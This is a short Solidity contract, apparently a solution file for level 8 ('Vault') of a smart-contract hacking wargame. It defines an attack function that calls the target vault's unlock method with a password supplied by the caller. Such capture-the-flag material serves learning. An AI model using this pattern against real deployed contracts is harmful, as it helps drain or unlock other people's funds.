// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import '../LevelsContracts/#8 Vault.sol';

contract VaultHack {
  function attack(address _target, bytes32 _password) public {
    Vault vault = Vault(_target);
    vault.unlock(_password);
  }
}
